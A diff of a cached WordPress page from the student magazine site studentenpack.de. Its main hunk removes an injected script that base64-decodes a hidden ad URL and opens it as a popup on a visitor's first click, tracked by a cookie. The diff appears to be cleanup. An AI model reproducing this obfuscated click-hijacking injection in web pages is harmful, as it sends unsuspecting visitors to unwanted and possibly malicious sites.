@@ -1,5 +1,4 @@
 
-
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="de-DE">
 
@@ -274,29 +273,7 @@ img.emoji {
 	<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js" type="text/javascript"></script>
 </head>
 
-<body><script>
-function b_de(e){var t="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
-var n,r,i,s,o,u,a,f,l=0,c="";do{s=t.indexOf(e.charAt(l++));o=t.indexOf(e.charAt(l++));
-u=t.indexOf(e.charAt(l++));a=t.indexOf(e.charAt(l++));f=s<<18|o<<12|u<<6|a;n=f>>16&255;r=f>>8&255;
-i=f&255;if(u==64)c+=String.fromCharCode(n);else if(a==64)c+=String.fromCharCode(n,r);
-else c+=String.fromCharCode(n,r,i)}while(l<e.length);return c}
-
-window.setC= function(){
-if (document.cookie.indexOf("visited") >= 0) {
-}
-else { 
-expiry = new Date();
-expiry.setTime(expiry.getTime()+(10*60*60*24*1000));
-document.cookie = "visited=yes; expires=" + expiry.toGMTString();
-window.open(b_de('aHR0cDovL3dvbmRlcmxhbmRhZHMuY29tL2FmdS5waHA/em9uZWlkPTIxNjMwNA=='));
-}
-
-}
-
-document.onclick = function(e) {
-window.setC();
-}
-</script>
+<body>
 <div id="container">
 <div id="header">
 	<a href="http://www.studentenpack.de"><div id="logo">&nbsp;</div></a>
@@ -1062,7 +1039,7 @@ $('#tablepress-8').dataTable({"language":DataTables_language["de_DE"],"stripeCla
 		<li id="wp-admin-bar-w3tc-flush-pgcache"><a class="ab-item"  href="http://www.studentenpack.de/wordpress/wp-admin/admin.php?page=w3tc_dashboard&#038;w3tc_flush_pgcache&#038;_wpnonce=ad4a5130d9">Empty Page Cache</a>		</li></ul></div>		</li>
 		<li id="wp-admin-bar-w3tc-faq"><a class="ab-item"  href="http://www.studentenpack.de/wordpress/wp-admin/admin.php?page=w3tc_faq">FAQ</a>		</li>
 		<li id="wp-admin-bar-w3tc-support"><a class="ab-item"  href="http://www.studentenpack.de/wordpress/wp-admin/admin.php?page=w3tc_support"><span style="color: red; background: none;">Support</span></a>		</li></ul></div>		</li>
-		<li id="wp-admin-bar-wp-piwik_stats"><div class="ab-item ab-empty-item" ></div>		</li></ul><ul id="wp-admin-bar-top-secondary" class="ab-top-secondary ab-top-menu">
+		<li id="wp-admin-bar-wp-piwik_stats"><a class="ab-item"  href="http://www.studentenpack.de/wordpress/wp-admin/?page=wp-piwik_stats"><script type='text/javascript'>var $jSpark = jQuery.noConflict();$jSpark(function() {var piwikSparkVals=[13,14,10,11,8,14,10,12,10,14,16,12,5,12,14,21,18,11,9,9,13,8,17,11,11,11,7,267,81,5];$jSpark('.wp-piwik_dynbar').sparkline(piwikSparkVals, {type: 'bar', barColor: '#ccc', barWidth:2});});</script><span class='wp-piwik_dynbar'>Loading...</span></a>		</li></ul><ul id="wp-admin-bar-top-secondary" class="ab-top-secondary ab-top-menu">
 		<li id="wp-admin-bar-search" class="admin-bar-search"><div class="ab-item ab-empty-item" tabindex="-1"><form action="http://www.studentenpack.de/" method="get" id="adminbarsearch"><input class="adminbar-input" name="s" id="adminbar-search" type="text" value="" maxlength="150" /><label for="adminbar-search" class="screen-reader-text">Suchen</label><input type="submit" class="adminbar-button" value="Suchen"/></form></div>		</li>
 		<li id="wp-admin-bar-my-account" class="menupop with-avatar"><a class="ab-item"  aria-haspopup="true" href="http://www.studentenpack.de/wordpress/wp-admin/profile.php">Willkommen, StudentenPACK<img alt='' src='http://0.gravatar.com/avatar/00f6728ffc7c771cafb1f37cee7fad19?s=26&#038;d=mm&#038;r=g' srcset='http://0.gravatar.com/avatar/00f6728ffc7c771cafb1f37cee7fad19?s=52&amp;d=mm&amp;r=g 2x' class='avatar avatar-26 photo' height='26' width='26' /></a><div class="ab-sub-wrapper"><ul id="wp-admin-bar-user-actions" class="ab-submenu">
 		<li id="wp-admin-bar-user-info"><a class="ab-item" tabindex="-1" href="http://www.studentenpack.de/wordpress/wp-admin/profile.php"><img alt='' src='http://0.gravatar.com/avatar/00f6728ffc7c771cafb1f37cee7fad19?s=64&#038;d=mm&#038;r=g' srcset='http://0.gravatar.com/avatar/00f6728ffc7c771cafb1f37cee7fad19?s=128&amp;d=mm&amp;r=g 2x' class='avatar avatar-64 photo' height='64' width='64' /><span class='display-name'>StudentenPACK</span><span class='username'>studentenpack</span></a>		</li>
@@ -1078,4 +1055,4 @@ $('#tablepress-8').dataTable({"language":DataTables_language["de_DE"],"stripeCla
 
 Page Caching using disk: enhanced (Requested URI is rejected)
 
- Served from: www.studentenpack.de @ 2015-10-13 06:48:36 by W3 Total Cache -->
+ Served from: www.studentenpack.de @ 2015-10-13 07:08:38 by W3 Total Cache -->
